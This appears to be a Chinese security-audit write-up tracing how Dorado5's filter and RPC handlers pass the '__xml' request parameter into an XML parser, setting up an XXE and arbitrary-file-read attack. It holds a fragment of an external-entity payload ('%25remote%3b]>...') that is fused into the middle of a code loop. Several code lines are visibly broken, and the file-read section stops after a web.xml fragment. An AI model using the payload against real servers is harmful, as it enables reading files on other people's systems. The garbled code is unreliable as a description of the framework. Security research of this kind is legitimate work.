> Author:jkgh006@敏信安全审计
## Dorado5简介
锐道DORADO集成开发平台软件 V5.0（简称Dorado5
IDE）产品是与锐道DORADO展现中间件软件V5.0（简称DORADO5）产品配套的集成开发平台，进一步升编程效率与团队开发规范性。简言之，Dorado5
IDE是Dorado5的配套开发工具。  
Dorado5 IDE支持控件属性设定、提供JavaScript事件编辑器、国际化资源文件编辑器、工程向导等。  
Dorado5 IDE采用Eclipse Plug-in技术，以插件形式与Eclipse开发环境融为一体.
参考链接：
客户案例：
## 框架流程分析
首先看web.xml
        doradofilter
        com.bstek.dorado.core.DoradoFilter
        doradofilter
        /*
分析DoradoFilter.class:
    public void init(FilterConfig filterConfig) throws ServletException {
            this.initSystemProperties();
            try {
                if (this.concreteFilter == null) {
                    String ex = filterConfig.getInitParameter("impl");
                    Class cl = CacheUtils.getClass(StringUtils.defaultString(ex,
                            "com.bstek.dorado.core.FilterHandle"));
                    Object o = cl.newInstance();
                    this.concreteFilter = (Filter) o;
                }
                this.concreteFilter.init(filterConfig);
            } catch (IllegalAccessException arg4) {
                arg4.printStackTrace();
            } catch (InstantiationException arg5) {
                arg5.printStackTrace();
            }
        }
初始化了com.bstek.dorado.core.FilterHandle，并且进行了new操作
    public void doFilter(ServletRequest request, ServletResponse response,
                FilterChain filterChain) throws ServletException, IOException {
            this.concreteFilter.doFilter(request, response, filterChain);
        }
根据filter的 链式效果将会调用FilterHandle的dofilter操作：
    public void doFilter(ServletRequest request, ServletResponse response,
                FilterChain filterChain) throws ServletException {
            try {
                HttpServletRequest ex = (HttpServletRequest) request;
                HttpServletResponse resp = (HttpServletResponse) response;
                boolean isRPC = false;
                boolean fromAgent = false;
                String qs = ex.getQueryString();
                if (qs != null) {
                    if (qs.endsWith("!$$")) {
                        ResponseCache rpcInfo1 = this.getResponseCache(qs);
                        if (rpcInfo1 != null) {
                            rpcInfo1.restoreResponse(ex, resp);
                        } else {
                            PrintWriter out = new PrintWriter(
                                    this.getResponseOutputStream(ex, resp));
                            out.write("Page Timeout!");
                            out.flush();
                            out.close();
                            resp.flushBuffer();
                        }
                        return;
                    }
                    FilterHandlerRPCInfo rpcInfo = this.parseQueryString(qs);
                    isRPC = rpcInfo.isRPC();
                    fromAgent = rpcInfo.isFromAgent();
                }
                if (isRPC) {
                    isRPC = !VariantHelper.parseBoolean(ex
                            .getAttribute("com.bstek.dorado.view.rpc.processed"));
                }
                DoradoContext.registerContext(HttpContextFactory
                        .getContext(request));
                try {
                    if (isRPC) {
                        if (fromAgent) {
                            this.doAgentRPCFilter(filterChain, ex, resp);
                        } else {
                            this.doRPCFilter(filterChain, ex, resp);
                        }
                    } else {
                        this.internalDoFilter(filterChain, ex, resp);
                    }
                } finally {
                    TransactionManager.disposeTransaction();
                    if (Setting.getBoolean("fixBug_100925")) {
                        DoradoContext.unregisterContext();
                    }
                }
            } catch (RuntimeException arg16) {
                throw arg16;
            } catch (ServletException arg17) {
                throw arg17;
            } catch (Throwable arg18) {
                throw new ServletException(arg18);
            }
        }
这里有两个地方可以分析：
  1. FilterHandlerRPCInfo rpcInfo =parseQueryString(qs);
  2. isRPC = rpcInfo.isRPC();fromAgent = rpcInfo.isFromAgent();
    private FilterHandlerRPCInfo parseQueryString(String queryString) {
            FilterHandlerRPCInfo rpcInfo = new FilterHandlerRPCInfo();
            String[] params = StringUtils.split(queryString, '&');
            for (int i = 0; i  0) {
                        String name = param.substring(0, ei);
                        String value;
                        if ("__rpc".equals(name)) {
                            value = param.substring(ei + 1);
                            this.validateParameterCharacters(value);
                            rpcInfo.setRPC(VariantHelper.parseBoolean(value));
                        } else if ("__rpcAgent".equals(name)) {
                            value = param.substring(ei + 1);
                            this.validateParameterCharacters(value);
                            rpcInfo.setFromAgent(VariantHelper.parseBoolean(value));
                        }
                    }
                }
            }
            return rpcInfo;
        }
如果我们的url是：smartweb2.RPC.d?__rpc=true 这里isRPC返回的就是ture
    try {
                    if (isRPC) {
                        if (fromAgent) {
                            this.doAgentRPCFilter(filterChain, ex, resp);
                        } else {
                            this.doRPCFilter(filterChain, ex, resp);
                        }
                    } else {
                        this.internalDoFilter(filterChain, ex, resp);
                    }
                } finally {
继续跟进一下doRPCFilter函数
    private void doRPCFilter(FilterChain filterChain, HttpServletRequest req,
                HttpServletResponse resp) throws Throwable {
            String qs = this.genNewQS();
            RPCHandler handler = RPCHelper.getHandler(req);
            ResponseCache responseCache = new ResponseCache();
            try {
                handler.init(req);
                DoradoBufferedResponse ex = new DoradoBufferedResponse(resp,
                        responseCache);
                this.internalDoFilter(filterChain, req, ex);
                if (!handler.isExecuted()) {
                    handler.execute();
                }
                ex.flushBuffer();
            } catch (Throwable arg14) {
                if (arg14 instanceof ServletException) {
                    handler.setError(((ServletException) arg14).getRootCause());
                } else {
                    handler.setError(arg14);
                }
                this.processException(arg14);
            } finally {
                DoradoContext.registerContext(HttpContextFactory.getContext(req));
                handler.endCalling(qs);
                String contentType = "text/xml";
                resp.setContentType("text/xml");
                PrintWriter out = new PrintWriter(this.getResponseOutputStream(req,
                        resp));
                Outputter xmlOutputter = OutputHelper.getOutputter(
                        handler.getClass(), "smartweb2");
                xmlOutputter.outputStartSection(out, handler, req);
                xmlOutputter.outputEndSection(out, handler, req);
                out.flush();
                out.close();
                resp.flushBuffer();
                if (responseCache.commitResponse()
                        && !NoForwardController.isNoForward(req)) {
                    this.storeResponseCache(responseCache, qs);
                }
                RPCHelper.disposeHandler(req);
                if (Setting.getBoolean("fixBug_100925")) {
                    DoradoContext.unregisterContext();
                }
            }
        }
这个函数总体逻辑分为三个
  1. RPCHandler handler = RPCHelper.getHandler(req); 获取对应的处理器
  2. handler.init(req); 初始化请求的上下文以及参数
  3. handler.execute(); 执行对应的action操作
    public static RPCHandler getHandler(HttpServletRequest request)
                throws Exception {
            RPCHandler handler = (RPCHandler) request
                    .getAttribute("com.bstek.dorado.view.rpc.RPCHandler");
            if (handler == null) {
                String type = request.getParameter("__type");
                handler = createHandler(type);
                request.setAttribute("com.bstek.dorado.view.rpc.RPCHandler",
                        handler);
            }
            return handler;
        }
这时候参数_type 就很重要的决定了handler的角色，如果我们传递的是__type=updateData，那么我们的处理类就是
    private static RPCHandler createHandler(String type) throws Exception {
            RPCHandler handler;
            if ("updateData".equalsIgnoreCase(type)) {
                handler = (RPCHandler) ClassHelper.newInstance(Setting.getString(
                        "view.updateDataRPCHandler",
                        UpdateDataRPCHandler.class.getName()));
            } else if ("loadData".equalsIgnoreCase(type)) {
                handler = (RPCHandler) ClassHelper.newInstance(Setting.getString(
                        "view.loadDataRPCHandler",
                        LoadDataRPCHandler.class.getName()));
            } else {
                handler = (RPCHandler) ClassHelper.newInstance(Setting.getString(
                        "view.baseRPCHandler", BaseRPCHandler.class.getName()));
            }
            return handler;
        }
回头再分析一下那个初始化方法
跟进分析UpdateDataRPCHandler这个类
    public void init(HttpServletRequest request) throws Exception {
            super.init(request);
            XmlDocument xmlDocument = this.getXmlDocument();
            XmlNode rootNode = xmlDocument.getRootNode();
            this.transactionMode = rootNode.getAttributeInt("transaction", 10);
            this.reduceReturnInfo = rootNode.getAttributeBoolean("rri");
            this.batch = UpdateBatchParser.parse(xmlDocument);
            this.parameters().assign(this.batch.parameters());
            ViewModel viewModel = this.getViewModel();
            this.applyUpdateBatch(viewModel, this.batch);
        }
调用父类BaseRPCHandler的init
    public void init(HttpServletRequest request) throws Exception {
            super.init(request);
            XmlDocument xmlDocument = this.getXmlDocument();
            XmlNode rootNode = xmlDocument.getRootNode();
            this.method = rootNode.getAttributeString("method");
        }
继续调用父类AbstractRPCHandler的init
    public void init(HttpServletRequest request) throws Exception {
            this.requestRef = new WeakReference(request);
            request.setAttribute("com.bstek.dorado.view.rpc.processed",
                    new Boolean(true));
            String xml = request.getParameter("__xml");
            String viewInstanceId = request.getParameter("__viewInstanceId");
            ViewModelCacheInfo info = ViewModelManager
                    .getViewModelInfo(viewInstanceId);
            this.viewModel = this.getViewModel(info);
            XmlBuilder builder = XmlFactory.createXmlBuilder();
            this.xmlDocument = builder.buildDocument(""
                    + xml);
            ParameterSet parameters = this.parameters();
            XmlNode[] paramNodes = null;
            XmlNode paramsNode = this.xmlDocument.getRootNode().getChild("ps");
            if (paramsNode != null) {
                paramNodes = paramsNode.getChildren();
            }
            if (paramNodes != null) {
                for (int properties = 0; properties %25remote%3b]>22221111111&1507876215851
整个框架的加载流程已经分析完成
## 任意文件读取
        doradoservlet
        com.bstek.dorado.core.DoradoServlet
        2